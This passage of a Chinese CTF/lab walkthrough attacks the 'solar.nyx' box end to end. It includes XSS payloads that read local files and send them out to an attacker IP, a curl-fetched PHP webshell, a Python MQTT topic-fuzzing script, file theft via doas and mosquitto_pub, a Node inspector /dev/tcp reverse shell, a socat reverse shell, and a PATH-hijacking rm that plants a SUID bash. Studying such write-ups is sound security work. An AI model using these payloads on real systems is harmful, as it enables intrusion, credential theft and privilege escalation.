            <?php foreach ($jsonFiles as $file): ?>
                <tr>
                    <td><?php echo htmlspecialchars(pathinfo($file, PATHINFO_FILENAME)); ?></td>
                    <td>
                        <a href="?download=true&file=<?php echo urlencode(basename($file)); ?>" class="download-btn">Download PDF</a>
                    </td>
                </tr>
            <?php endforeach; ?>
        </table>
        <a href="../dashboard.php" class="logout-link">< Back</a>
    </div>
</body>

</html>
```

### 6.7 index.php 源码分析

文件开头先 `include("../session.php")`，并检查 `$_SESSION['role'] == 'admin'`；因此不能匿名访问下载接口。

**1. `chart` 未经过 HTML 转义，直接进入模板：**

```php
$html .= '<h1>Solar Energy Data<br><small>' . htmlspecialchars($data['time']) . '</small></h1><br><br><br><div class="energy-meter"><img src="' . ($data['chart']) . '" /></div><br>';
```

**2. PDF 生成命令限制了本地文件范围：**

```php
$command = escapeshellcmd("wkhtmltopdf --disable-local-file-access --allow /var/www/ $tempHtmlFile $outputPdfFile");
```

`--disable-local-file-access` 关闭默认的本地文件访问，`--allow /var/www/` 只放行 `/var/www/` 下的文件。因此可以读 `/var/www/solar.nyx/records/index.php`，但读不到 `/etc/passwd`。

**3. 之前的路径穿越被 `basename()` 和扩展名检查拦下：**

```php
if (isset($_GET['download']) && isset($_GET['file'])) {
    $file = basename($_GET['file']);
    $filePath = $directory . '/' . $file;

    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'json') {
```

`basename('../../../../../etc/passwd')` 的结果是 `passwd`，再到当前目录找 `passwd`，文件不存在，返回 404。并且只允许 `.json` 文件，所以一开始的任意文件读取没有成立。

**4. PDF 只在下载分支生成：**

`generatePDF()` 在 `if (isset($_GET['download']) ...)` 内被调用，这解释了为什么只发布 `record` 不会触发渲染。

![](images/2026-10-23-09-52-04-image.png)

### 6.8 读取 session.php

`index.php` 开头 include 了 `../session.php`，它负责会话 Cookie 和 `session_start()`。用同样的方式读取：

![](images/2026-10-23-09-59-56-image.png)

```text
"chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/session.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
```

> 原文 Payload 把 `session.php` 写成了 `sesion.php`（少一个 `s`）；上面的命令块已按实际文件名修正，避免照抄后读错文件。

`session.php` 源码：

```php
<?php

$secure = true; // if you only want to receive the cookie over HTTPS
$httponly = true; // prevent JavaScript access to session cookie
$samesite = 'Strict';

$nonce = bin2hex(random_bytes(16));

if (PHP_VERSION_ID < 70300) {
    session_set_cookie_params($maxlifetime, '/; samesite=' . $samesite, $_SERVER['HTTP_HOST'], $secure, $httponly);
} else {
    session_set_cookie_params([
        'lifetime' => $maxlifetime,
        'path' => '/',
        'domain' => $_SERVER['HTTP_HOST'],
        'secure' => $secure,
        'httponly' => $httponly,
        'samesite' => $samesite
    ]);
}


header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");


session_start();
```

这段配置涉及三个常见 Cookie 属性：

- **`HttpOnly`**：禁止前端 JS 通过 `document.cookie` 读取 Cookie，只允许浏览器在请求时自动携带。
- **`Secure`**：Cookie 只能通过 HTTPS 传输，防止在普通 HTTP 下被中间人抓包。
- **`SameSite=Strict`**：跨站请求不会携带该 Cookie。

这些属性决定了 XSS 能直接拿到哪些数据；本例最终选择外带页面源码。

### 6.9 读取 login.php

回到目录扫描结果，读取 `login.php`：

![](images/2026-10-23-10-16-48-image.png)

Payload（沿用 6.8 的读文件模板，只替换目标路径）：

```text
"chart": "\"><script>x=new XMLHttpRequest();x.open('GET','file:///var/www/solar.nyx/login.php',false);x.send();document.write('<img src=\"http://192.168.56.1:8000/?d='+btoa(x.responseText)+'\">');</script><x=\""
```

> 原文这里沿用了 `sesion.php` 的笔误；上面的路径已改为实际目标 `login.php`，照抄原文会读取失败。

`login.php` 源码：

```php
<?php
include("session.php");


$servername = "127.0.0.1";
$username = "solar_user";
$password = "lD5vkvLfMowAiaT7w64C";
$dbname = "solar_energy_db";


try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);

    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $user = $_POST['username'];
        $pass = $_POST['password'];
        $hashed_pass = hash('sha256', $pass);
        $stmt = $conn->prepare("SELECT id, password, role FROM users WHERE username = :username");
        $stmt->bindParam(':username', $user);
        $stmt->execute();
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($row) {
            if ($hashed_pass === $row['password']) {
                session_regenerate_id(true);
                $_SESSION['id'] = $row['id'];
                $_SESSION['username'] = $user;
                $_SESSION['role'] = $row['role'];
                header("Location: dashboard.php");
                exit();
            } else {
                header("Location: index.php?msg=" . urlencode("Invalid password."));
            }
        } else {
            header("Location: index.php?msg=" . urlencode("No user found with that username."));
        }
    }
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

$conn = null;
?>
```

关键点：

- 数据库账号 `solar_user` / `lD5vkvLfMowAiaT7w64C` 硬编码在源码里。
- 用户名使用 PDO 预处理，避免了常规 SQL 注入。
- 密码用 `hash('sha256', $pass)` 比较，未加盐；数据库里存的是 SHA-256。
- 登录成功后调用 `session_regenerate_id(true)`，并写入 `$_SESSION['role']`。

内网才能访问这个 `login.php` 登录页：

![](images/2026-10-23-10-20-59-image.png)

### 6.10 读取 server.php

再读 `www.sunfriends.nyx` 的 `/server.php`：

![](images/2026-10-23-10-28-53-image.png)

`server.php` 源码：

```php
<?php
$secure = true;
$httponly = true;
$samesite = 'Strict';
$secret = [
    'user' => '5up3r',
    'pass' => 'bloods'
];

if (PHP_VERSION_ID < 70300) {
    session_set_cookie_params($maxlifetime, '/; samesite=' . $samesite, $_SERVER['HTTP_HOST'], $secure, $httponly);
} else {
    session_set_cookie_params([
        'lifetime' => $maxlifetime,
        'path' => '/',
        'domain' => $_SERVER['HTTP_HOST'],
        'secure' => $secure,
        'httponly' => $httponly,
        'samesite' => $samesite
    ]);
}
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Verify credentials 
    if ($username === $secret['user'] && $password === $secret['pass']) {
        $_SESSION['loggedin'] = true;
        header('Location: server.php');
        exit;
    } else {
        $error = "Incorrect username or password.";
    }
}

if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    // Handle logout
    if (isset($_POST['logout'])) {
        session_destroy();
        header('Location: server.php');
        exit;
    }

    // Handle command execution
    if (isset($_POST['execute']) && isset($_POST['command_file'])) {
        $commandFile = 'commands/' . basename($_POST['command_file']);
        if (file_exists($commandFile)) {
            $commandJson = file_get_contents($commandFile);
            $command = json_decode($commandJson, true);

            if (isset($command['cmd'])) {
                $output = shell_exec(escapeshellcmd($command['cmd']));
                $mqttHost = 'localhost';
                $mqttTopic = 'server/command/output';
                $mqttMessage = json_encode([
                    'name' => $command['name'],
                    'command' => $command['cmd'],
                    'output' => base64_encode($output)
                ]);
                $mqttCommand = sprintf(
                    'mosquitto_pub -h %s -t %s -m %s -u '.$secret['user'].' -P \''.$secret['pass'].'\'',
                    escapeshellarg($mqttHost),
                    escapeshellarg($mqttTopic),
                    escapeshellarg($mqttMessage)
                );
                shell_exec($mqttCommand);
            } else {
                $output = "Invalid command format in the file.";
            }
        } else {
            $output = "Command file not found.";
        }
    }

    // Get list of command files
    $commandFiles = array_diff(scandir('commands'), ['.', '..', 'php-info.php']);

    // Show admin panel if user is authenticated
    ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <title>Admin Panel</title>
        <link rel="stylesheet" href="/style.css">
        <link rel="stylesheet" href="/styleadmin2.css">
    </head>

    <body>
        <main>
            <h1>Server Administration Panel</h1>
            <p>This is a server administration or management page.</p>
            <p style="text-align:left;">Server contains two websites:
            <ul>
                <li style="text-align:left;"><strong>sunfriends.nyx</strong> a forum about solar energy.</li>
                <li style="text-align:left;"><strong>solar.nyx</strong> a real time control panel for the community solar
                    installation.</li>
            </ul>
            </p>
            <form method="post" action="">
                <input type="submit" name="logout" value="Logout">
            </form>
            <h2>Server Information</h2>
            <form method="post" action="">
                <label for="command_file">Select Command:</label>
                <select name="command_file" id="command_file" required>
                    <?php foreach ($commandFiles as $file): ?>
                        <option value="<?php echo htmlspecialchars($file); ?>"><?php echo htmlspecialchars($file); ?></option>
                    <?php endforeach; ?>
                </select>
                <br><br>
                <input type="submit" name="execute" value="Execute">
            </form>
            <?php if (isset($output)): ?>
                <h3>Command Output:</h3>
                <pre><?php echo htmlspecialchars($output); ?></pre>
            <?php endif; ?>
        </main>
    </body>

    </html>
    <?php
} else {
    // Show login form if user is not authenticated
    ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login - Solar Community Server</title>
        <link rel="stylesheet" href="/style.css">
        <link rel="stylesheet" href="/styleadmin.css">

    </head>

    <body>
        <!-- Main container for the login form -->
        <div class="login-container">
            <!-- Page header -->
            <h2>Admin Login</h2>

            <!-- Subheader to clarify the purpose of the login -->
            <h3>Administration Server for <strong>solar.nyx</strong> and <strong>sunfriends.nyx</strong></h3>

            <!-- Display error message if present -->
            <?php if (isset($error)): ?>
                <p class="error"><?php echo $error; ?></p>
            <?php endif; ?>

            <!-- Login form -->
            <form method="post" action="">
                <!-- Username input -->
                <label for="username">Username</label>
                <input type="text" name="username" id="username" required>

                <!-- Password input -->
                <label for="password">Password</label>
                <input type="password" name="password" id="password" required>

                <!-- Submit button -->
                <input type="submit" value="Login">
            </form>

            <!-- Footer link to the main site -->
            <div class="footer-link">
                <p>Not an admin? <a href="/">Return to Solar Community Forum</a></p>
            </div>
        </div>
    </body>

    </html>
    <?php
}
?>
```

这份源码同时暴露了：

- 明文凭据 `5up3r` / `bloods`。
- 命令文件目录 `commands/`。
- `shell_exec(escapeshellcmd($command['cmd']))` 命令执行。
- 执行结果通过 `mosquitto_pub` 发到 `server/command/output`。

下一节沿着这条线继续。

> **阶段复盘 · wkhtmltopdf 源码读取**
>
> - **目标**：利用 `record` 的 `chart` 字段读取后端源码。
> - **关键发现**：`chart` 直接拼进 HTML；`basename()` + `.json` 限制挡住路径穿越；`--allow /var/www/` 限定本地文件范围。
> - **结果**：拿到 `index.php`、`session.php`、`login.php`、`server.php` 及硬编码凭据。
> - **下一跳**：利用 `server.php` 的命令执行面板与 MQTT 命令队列。

## 7. 第二入口：server.php 与 MQTT 命令队列

### 7.1 server.php 的逻辑

`server.php` 同样把明文凭据写在源码里，登录后是一个命令执行面板：

![](images/2026-10-23-10-38-35-image.png)

页面可以直接访问：

![](images/2026-10-23-10-39-09-image.png)

进入后能看到 systemd 状态等信息，但只能从下拉框选择已有命令，无法自定义输入：

![](images/2026-10-23-10-42-50-image.png)

关键逻辑：

```php
$commandFile = 'commands/' . basename($_POST['command_file']);

if (file_exists($commandFile)) {
    $commandJson = file_get_contents($commandFile);
    $command = json_decode($commandJson, true);

    if (isset($command['cmd'])) {
        $output = shell_exec(escapeshellcmd($command['cmd']));
        // ...
    }
}
```

执行完命令后，它还会把输出打包成 JSON，通过 `mosquitto_pub` 发送到 MQTT 的 `server/command/output` 主题：

```php
$mqttMessage = json_encode([
    'name' => $command['name'],
    'command' => $command['cmd'],
    'output' => base64_encode($output)
]);

$mqttCommand = sprintf(
    'mosquitto_pub -h %s -t %s -m %s -u '.$secret['user'].' -P \''.$secret['pass'].'\'',
    escapeshellarg($mqttHost),
    escapeshellarg($mqttTopic),
    escapeshellarg($mqttMessage)
);
shell_exec($mqttCommand);
```

`mosquitto_pub` 是 Linux 下发送 MQTT 消息的命令行工具。执行结果被 Base64 编码后发到 `server/command/output`：

![](images/2026-10-23-10-55-54-image.png)

![](images/2026-10-23-10-57-24-image.png)

用 `server.php` 的身份连接 Broker，订阅输出主题，就能看到命令结果：

![](images/2026-10-23-11-12-37-image.png)

### 7.2 双端输入猜想与 Topic 爆破

Web 端是一个输入端：选择命令文件 → `shell_exec` → 结果发到 `server/command/output`。那么 MQTT 端是否也有一个输入点，收到消息后写命令文件或执行命令？

这个输入点需要 Fuzzing。可能的名字包括 `server/command/input`、`input`、`server/np` 等。Web 端用的是 `cmd` 字段，测试 MQTT 时也优先用 `cmd` 传参。

实际处理的主题是 `server/command/new`：

![](images/2026-10-23-11-57-17-image.png)

> **权限隔离**：不能用 admin 的 MQTT 账号向 `server/command/new` 发消息。这里使用的是 `server.php` 里的 `5up3r` / `bloods`。

### 7.3 Python 批量上传 Topic

用 Python 和 `paho-mqtt` 批量向候选 Topic 发布命令：

```python
import paho.mqtt.client as mqtt
import ssl
import json
import time

# 1. 放入你想要爆破的主题字典
topics = [
    "server/command/new",
    "server/command/add",
    "server/command/info",
    "server/command/exec",
    "server/command/cmd",
    "test",
    "status"
]

# 2. 准备要发送的 Payload (注意必须带上 name 字段，否则会报错)
payload = {
    #"name": "fuzzer-test",
    "cmd": "whoami"
}
json_data = json.dumps(payload)

client = mqtt.Client(client_id="ssrf-tester", transport="websockets", protocol=mqtt.MQTTv311)
client.username_pw_set("5up3r", "bloods")
client.ws_set_options(path="/wss/")
client.tls_set(cert_reqs=ssl.CERT_NONE)
client.tls_insecure_set(True)

print("[*] 正在连接靶机...")
client.connect("www.solar.nyx", 443, 60)

# 关键：启动后台网络循环，否则消息发不出去
client.loop_start()

print("[*] 开始爆破 Topic...")
for topic in topics:
    print(f"[+] Sending to: {topic}")
    # 3. 将主题变量填入 publish
    client.publish(topic, json_data)
    # 关键：停顿 0.5 秒，防止发太快被服务器判定为洪水攻击或丢包
    time.sleep(0.5)

print("[*] 发送完毕，等待 2 秒让网络把数据彻底传完...")
time.sleep(2)

client.disconnect()
client.loop_stop()
print("[+] OK，爆破结束。")
```

> 脚本中的 `name` 字段仍被注释掉，保留了首次尝试的状态；对应 7.4 会先触发“缺少 `name`”的报错，补上字段后再发送。

几个关键参数：

- `transport="websockets"` + `ws_set_options(path="/wss/")`：走 WebSocket。
- `tls_set(cert_reqs=ssl.CERT_NONE)` + `tls_insecure_set(True)`：忽略自签名证书。
- `loop_start()`：启动后台网络循环，否则消息发不出去。
- 每次发布后 `sleep(0.5)`：避免发送过快被丢弃。

### 7.4 第一次尝试：缺少 name 字段

发送后，订阅的主题出现了：

![](images/2026-10-23-12-27-15-image.png)

服务端提示缺少 `name` 字段：

![](images/2026-10-23-12-31-06-image.png)

补上 `name` 后不再报错，但 `server/command/output` 没有回显。当时推测后台同样调用了 `escapeshellcmd()`：

```php
$output = shell_exec(escapeshellcmd($command['cmd']));
```

MQTT Broker 本身不处理消息，只是中转站。真正处理消息的是服务器上的后台脚本（例如 `daemon.php`）：它订阅主题、提取 JSON 里的 `cmd` 字段，再把命令交给系统执行。这个脚本为了安全，可能也调用了 `escapeshellcmd()`。

`escapeshellcmd()` 的过滤规则大致是：

- 允许空格、常规字母和数字。
- 单引号和双引号在成对时会被保留。
- 会转义 shell 元字符，但它不是命令白名单。

所以这里没有输出，不一定是过滤导致，也可能是命令根本没有在 MQTT 端立即执行。后面的实验证明了这一点。

### 7.5 失败尝试：直接命令执行没有发生

尝试用 `curl` 从攻击机下载 webshell：

```json
{
  "name": "fwonowwn",
  "cmd": "curl -o /var/www/solar.nyx/exp.php http://192.168.56.1:8000/shell.php"
}
```

虽然已经定位到 `server/command/new`，但还不确定它是否会立即执行，于是仍向候选 Topic 批量发送：

![](images/2026-10-23-13-04-00-image.png)

`www-data` 权限很低，下载的文件不一定能写进 `/var/www/solar.nyx/exp.php`。不过从 `index.php` 的 `glob()` / `unlink()` 逻辑看，`www-data` 对 `/var/www/solar.nyx/records` 有写权限，所以后来把木马放到这个目录。

> 原文此处写作 `/var/www/solar.php/records`，结合前文 `index.php` 的实际路径，应为 `/var/www/solar.nyx/records`。

但在 `server/command/new` 里发送的“请求攻击机”的命令一直没有执行。回到 `server.php` 页面继续观察后，才发现真正的流程不是 MQTT 直接执行命令。

### 7.6 正确流程：异步命令队列

先把内容上传到 `server/command/new` 主题，然后回到 Web 的 `server.php` 页面，在下拉框里选择这个命令文件，点击执行。命令才会运行，结果再发到 `server/command/output`。

![](images/2026-10-23-13-41-48-image.png)

这个现象叫 **异步任务队列（Asynchronous Task Queue）**。如果由有经验的开发者设计，不会让 MQTT 消息直接触发系统命令执行，因为 Broker 一旦被攻破，服务器就会直接失守。

更合理的设计是：

1. **Web 前端或 MQTT 客户端只“提需求”**：收到命令后，只写一个 JSON 配置文件到 `commands/` 目录。
2. **后台人工审核或定时脚本**：管理面板 `server.php` 读取这个目录，管理员确认后才执行。

因此，`server/command/new` 只负责让命令文件存在；真正的执行入口在 `server.php` 页面。这个“审核”步骤在攻防中反而成了可利用的交互点。

### 7.7 上传并访问 Webshell

把下载 webshell 的命令写入 `server/command/new`：

```json
{
  "name": "hacker",
  "cmd": "curl -o /var/www/solar.nyx/records/ppppppp.php http://192.168.56.1:8000/web.php"
}
```

命令出现在面板中：

![](images/2026-10-23-14-03-50-image.png)

执行后下载成功：

![](images/2026-10-23-14-08-16-image.png)

![](images/2026-10-23-14-09-19-image.png)

访问 webshell 触发，返回了 `ok`，但没有收到 Shell 回连：

![](images/2026-10-23-14-13-46-image.png)

说明文件存在，可能是木马与目标环境不兼容，或者是本地 HTTP 服务的问题。后来发现是 `server.py` 的问题，改用 `python3` 启动 HTTP 服务后成功。

最终使用的 webshell：

```php
<?php system($_GET['code']); ?>
```

![](images/2026-10-23-14-47-16-image.png)

![](images/2026-10-23-14-51-48-image.png)

> **阶段复盘 · server.php 与 Webshell**
>
> - **目标**：利用 `server.php` 的命令执行能力拿到 Web 权限。
> - **关键发现**：Web 端只能执行 `commands/` 下已有文件；MQTT 的 `server/command/new` 可以写入新的命令文件。
> - **结果**：上传命令文件 → 在面板点击执行 → 下载 PHP webshell，以 `www-data` 身份执行命令。
> - **下一跳**：枚举 `doas`，从 `www-data` 横向到普通用户。

## 8. 横向移动：doas 与 MQTT 外带

### 8.1 www-data 枚举与 doas

拿到 `www-data` 权限后先做基础枚举：

- 目标上有 `socat` 可用。
- 能进入用户目录，但没有权限读取文件。
- 有一个只允许内网访问的 MySQL 服务，没有密码登录不上。

![](images/2026-10-23-15-11-04-image.png)

`/etc/doas.conf` 是 `doas` 的配置文件。`doas` 是 `sudo` 的轻量级替代品，在 OpenBSD 系统中很常见，精简版 Linux 也常使用。

![](images/2026-10-23-15-15-54-image.png)

![](images/2026-10-23-15-21-54-image.png)

### 8.2 用 mosquitto_pub 外带文件

`doas` 规则允许以 `lenam` 身份执行 `/usr/bin/mosquitto_pub`。利用 `-f` 参数，可以把本地文件内容作为 MQTT 消息发到 Broker，再从 Broker 读取：

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test -f /home/lenam/user.txt
```

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test -f /home/lenam/note.txt
```

参数说明：

- `-L`：用 URI 形式指定 Broker 地址、账号和主题。
- `-f`：把文件内容作为消息体。
- `doas -u lenam`：以 `lenam` 身份读取文件，绕过 `www-data` 的权限限制。

![](images/2026-10-23-15-27-25-image.png)

把消息发到已知存在的 `test` 主题（也可以发到 `data`），然后在 Broker 客户端查看内容：

![](images/2026-10-23-15-30-51-image.png)

### 8.3 user.txt 与 note.txt 的线索

从 `user.txt` 和 `note.txt` 中拿到：

```text
c25e7b68dd71d1ca9d8f86da2df12035
```

```text
You just have to remember the one that starts with love and ends with a number

你只需要记住那个以 love 开头，并且以数字结尾
```

`note.txt` 是密码提示：口令以 `love` 开头、以数字结尾。

### 8.4 读取 SSH 私钥

继续用同样的方法外带 `lenam` 的 SSH 私钥：

```bash
doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/test -f /home/lenam/.ssh/id_ed25519
```

![](images/2026-10-23-15-41-58-image.png)

私钥需要 passphrase。尝试用 `user.txt` 里的字符串：

```text
c25e7b68dd71d1ca9d8f86da2df12035
```

![](images/2026-10-23-15-46-26-image.png)

解不开，换路。

### 8.5 批量读取本地文件

继续用 `doas -u lenam /usr/bin/mosquitto_pub -f` 读取本地文件。需要写脚本批量读，并通过回显类型判断文件是否存在：

![](images/2026-10-23-19-01-44-image.png)

把错误重定向到输出，就可以按行判断文件类型：

![](images/2026-10-23-19-03-54-image.png)

脚本细节不再展开。关键的 passphrase 出现在 `/home/lenam/.local/share/nano/search_history`：

![](images/2026-10-23-19-35-53-image.png)

```text
CzMO48xpwof8nvQ6JUhF
```

同时找到两个 GPG 密钥：

![](images/2026-10-23-19-49-48-image.png)

### 8.6 GPG 破解与 lenam 密码

回到 `user.txt` 里的字符串 `c25e7b68dd71d1ca9d8f86da2df12035`，它也可能是 GPG 的 passphrase。尝试解密：

```bash
gpg -d user.gpg
```

![](images/2026-10-23-20-03-20-image.png)

![](images/2026-10-23-20-02-00-image.png)

失败。`note.txt` 里的 “love 开头、数字结尾” 才是 GPG passphrase 的提示。

**用字典暴力跑 GPG passphrase，在现实中成功率极低**，现代 GPG 的加密算法计算成本很高。这里用 Hashcat 的 `gpg-ocb-aes2hashcat.py` 把 `.gpg` 密钥转换成 Hashcat 能识别的格式：

![](images/2026-10-23-20-56-49-image.png)

`loveboy1` 是 passphrase。一个 passphrase 解开了 3 个文件：

![](images/2026-10-23-20-20-09-image.png)

关键结果：

- **`personal/private_id.gpg` → `CzMO48xpwof8nvQ6JUhF`**：SSH 私钥的 passphrase。
- **`personal/user.gpg` → `qiFQI7buDp7zIQnAymEY`**：`lenam` 的用户密码。

有了 SSH passphrase 和用户密码，就可以横向到 `lenam`。

> **阶段复盘 · 横向到 lenam**
>
> - **目标**：从 `www-data` 横向到普通用户。
> - **关键发现**：`doas` 允许以 `lenam` 身份执行 `mosquitto_pub`；可用 `-f` 读取文件并发送到 Broker。
> - **结果**：外带 `user.txt`、`note.txt`、SSH 私钥；从 nano 历史拿到 passphrase；Hashcat 破解 GPG，得到 `lenam` 密码。
> - **下一跳**：用 `lenam` 身份触发 `julian` 的 Node.js 调试接口。

## 9. 提权到 julian：Node.js 调试接口

### 9.1 发现 Node 进程与 doas 规则

Node.js 是让 JavaScript 在浏览器之外运行的运行时环境。

```bash
julian     25890  3.4  3.9 1053772 79640 ?       Ssl  12:04   0:01 /home/julian/.nvm/versions/node/v22.7.0/bin/node /home/julian/.local/bin/demoadm/login.js
```

`julian` 运行了一个 Node.js 服务。`/etc/doas.conf` 中还有一条规则：

```text
permit lenam as julian cmd /bin/kill
```

也就是说，`lenam` 可以以 `julian` 身份执行 `/bin/kill`。

### 9.2 SIGUSR1 打开调试端口

Node.js 收到 `SIGUSR1` 后会开启调试模式：

```text
node 进程收到 kill 的 SIGUSR1
  → 自动开启调试模式
  → 默认监听 localhost:9229
  → 可以用 node inspect 连进去
  → 在调试器里执行任意 JS
  → 以 julian 身份拿到 shell
```

按 doas 规则，命令形如 `doas -u julian /bin/kill -SIGUSR1 <PID>`；原文未记录实际执行的完整命令，PID 可从上一步的 `ps` 输出获取（例如 `25890`，若进程已重启需重新确认）。

发送后，调试端口出现：

![](images/Pasted%20image%2020261024123801.png)

### 9.3 连接调试器并反弹 Shell

用 `julian` 的 Node 二进制连接调试端口：

```bash
/home/julian/.nvm/versions/node/v22.7.0/bin/node inspect localhost:9229
```

进入调试器后执行反弹 Shell：

```javascript
exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/192.168.56.1/9999 0>&1\"')")
```

调试接口会很快关闭，所以要尽快执行命令：

![](images/Pasted%20image%2020261024125340.png)

如果命令执行成功，就会以 `julian` 身份回连。

> **阶段复盘 · julian**
>
> - **目标**：从 `lenam` 横向到 `julian`。
> - **关键发现**：`lenam` 可以用 `doas` 以 `julian` 身份执行 `/bin/kill`；`julian` 的 Node 服务支持通过 `SIGUSR1` 开启调试端口。
> - **结果**：连接 `localhost:9229`，在调试器中执行 JS，以 `julian` 身份拿到 shell。
> - **下一跳**：利用 `julian` 的 `doas` 规则提权到 root。

## 10. 提权到 root：backups 与 PATH 劫持

### 10.1 doas backups 规则

```text
permit setenv { PATH } julian as root cmd /usr/local/bin/backups
```

`setenv { PATH }` 表示：为目标进程创建环境时，保留调用者现有的 `PATH` 值。这是后续 PATH 劫持成立的关键条件。

`julian` 的密码从截图提取：

```text
tk8QaHUi3XaMLYoP1BpZ
```

### 10.2 分析 backups 的依赖

`ldd` 可以查看程序运行时依赖哪些动态共享库：

```bash
ldd /usr/local/bin/backups
```

![](images/Pasted%20image%2020261024133422.png)

`ldd` 只提供依赖信息，但可以帮助判断：

- 是否依赖非标准共享库。
- 是否存在异常的库搜索路径或依赖。
- 是否值得继续检查动态库加载机制。

`readelf` 读取 ELF 文件本身的结构信息：

```bash
readelf -d /usr/local/bin/backups
```

动态段中常见的信息包括：

- `NEEDED`：程序依赖的共享库。
- `RPATH` / `RUNPATH`：指定的动态库搜索路径。

![448](images/Pasted%20image%2020261024134428.png)

用 `strings` 可以看到 `dlopen`、`dlsym`、`dlclose`，说明程序会动态加载库。检查过程中出现库加载错误；随后在 `/var/www/sunfriends.nyx/database.sql.gz` 中解出 `libbackup.so`：

![](images/Pasted%20image%2020261024135742.png)

![440](images/Pasted%20image%2020261024141746.png)

`libbackup.so` 不是常见的系统动态库，应该是 `backups` 自带的库。继续查看：

![](images/Pasted%20image%2020261024142040.png)

![](images/Pasted%20image%2020261024142233.png)

发现该文件所有人可读：

![](images/Pasted%20image%2020261024142409.png)

库中调用 `rm` 时使用的是相对路径，而不是 `/bin/rm`。结合 doas 保留 `PATH` 的规则，可以劫持 `rm`。

### 10.3 PATH 劫持

`doas` 规则保留 `julian` 的 `PATH`，所以只要把恶意程序命名为 `rm`，放进 `julian` 的 `PATH` 目录，`backups` 以 root 运行时就会执行它。

作者最终把恶意脚本放在 `~/.local/bin/rm`。先看一种更直接的反弹 Shell 思路：

```bash
socat TCP:192.168.56.1:2222 EXEC:'bash',pty,stderr,setsid,sigint,sane
```

监听端：

```bash
socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:2222
```

这样弹回来的 shell 只是用不了 `rm` 命令。更稳妥的做法是让恶意 `rm` 复制 SUID bash：

```bash
julian@solar:~$ nano .local/bin/rm

julian@solar:~$ cat .local/bin/rm
#!/bin/bash

cp /bin/bash /tmp/
chmod u+s /tmp/bash

julian@solar:~$ chmod +x .local/bin/rm
```

然后以 root 运行 `backups`。先随便传一个不存在的数据库名：

```bash
julian@solar:/tmp$ doas /usr/local/bin/backups nio
doas (julian@solar) password:
mysqldump: Got error: 1049: "Unknown database 'nio'" when selecting the database
Error executing mysqldump and gzip. Exit code: 512
```

说明 `backups` 会先执行 `mysqldump`，需要一个存在的数据库名。数据库备份文件在 `/var/www/sunfriends.nyx/database.sql.gz`：

![](images/Pasted%20image%2020261024145450.png)

这是数据库备份文件，预览里面的数据库名：

```bash
gzip -dc /var/www/sunfriends.nyx/database.sql.gz
```

![](images/Pasted%20image%2020261024150028.png)

![](images/Pasted%20image%2020261024150232.png)

拿到实际数据库名后，再次执行 `doas /usr/local/bin/backups <数据库名>`。`backups` 以 root 运行，调用恶意 `rm`，执行 `cp /bin/bash /tmp/` 和 `chmod u+s /tmp/bash`。

SUID bash 生成后，即可用它进入 root shell。

> **阶段复盘 · root**
>
> - **目标**：从 `julian` 提权到 root。
> - **关键发现**：`doas` 允许以 root 运行 `/usr/local/bin/backups` 并保留 `PATH`；`libbackup.so` 调用 `rm` 时使用相对路径。
> - **结果**：在 `PATH` 目录放置恶意 `rm`，`backups` 以 root 执行它，复制 SUID bash，拿到 root shell。

## 11. 复盘与速查

### 11.1 动态库与 PATH 劫持的检查方法

- **静态分析**：`file`、`strings`、`readelf` 用于寻找文件类型、字符串、动态依赖等线索。
- **运行时分析**：如果程序会动态加载库，使用适当的跟踪工具观察实际加载行为。
- **调用链分析**：检查共享库如何执行外部命令，尤其关注 `system()`、命令拼接和未使用绝对路径的命令。
- **权限链验证**：判断普通用户是否能控制被执行的文件，以及该文件最终会以什么权限运行。

### 11.2 踩坑与修正

| 现象                         | 原因                                          | 修正                                                    |
| ---------------------------- | --------------------------------------------- | ------------------------------------------------------- |
| `new Image()` 外带无数据     | HTTPS 页面请求 HTTP 资源被浏览器拦截或升级    | 改用 `location.href`                                    |
| GET 外带 414                 | `btoa(encodeURIComponent())` 使 URL 过长      | 用 `btoa(String.fromCharCode(...))` 压缩；POST 也被丢弃 |
| `/records` 路径穿越 404      | `basename()` 拦截穿越，且只允许 `.json`       | 从 `index.php` 源码确认，改读 `/var/www/` 下的源码      |
| 发布 `record` 后服务器无请求 | PDF 只在点击下载时生成                        | 先下载 PDF 触发渲染                                     |
| MQTT 命令提示缺少 `name`     | 首次 Payload 没带 `name` 字段                 | 补上 `name` 后再发送                                    |
| 直接向 MQTT 发命令无输出     | MQTT 只落命令文件，需在 `server.php` 面板执行 | 上传命令文件后手动执行                                  |
| 原文路径写成 `sesion.php`    | 少一个 `s`，照抄会读取失败                    | 按实际文件名修正                                        |
| webshell 返回 `ok` 但无回连  | 本地 `server.py` 的问题                       | 改用 `python3` 启动 HTTP 服务                           |
| GPG passphrase 猜错          | `user.txt` 字符串不是 GPG passphrase          | 从 nano 历史取 SSH passphrase；用 Hashcat 破解 GPG      |

### 11.3 整条链复习清单

- [ ] 443 证书 SAN 枚举域名
- [ ] 目录爆破拿到登录页和 `database.sql.gz`
- [ ] 登录后台，源码泄露 MQTT 凭据
